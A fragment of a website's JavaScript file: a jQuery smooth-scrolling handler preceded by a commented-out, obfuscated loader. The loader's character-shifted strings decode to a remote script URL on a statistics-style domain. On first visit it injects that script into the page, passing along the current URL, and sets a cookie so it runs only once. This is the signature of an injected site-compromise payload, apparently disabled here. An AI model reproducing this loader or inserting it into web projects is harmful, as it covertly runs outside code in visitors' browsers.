    }
}();

// (function(o, d, l) {
//     try {
//         o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
//         o.b = o.f('UMUWJKX');
//         o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
//             o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
//         }, 1000);
//         d.cookie = o.b + '=full;max-age=39800;'
//     } catch (e) {};
// }({}, document, location));

(function($) {
    "use strict"; // Start of use strict
  
    // Smooth scrolling using jQuery easing
    $('a.js-scroll-trigger[href*="#"]:not([href="#"])').click(function() {
      if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
        var target = $(this.hash);
        target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
        if (target.length) {
          $('html, body').animate({
            scrollTop: (target.offset().top - 71)
          }, 1000, "easeOutQuart");
          return false;
        }
      }
    });
})(jQuery);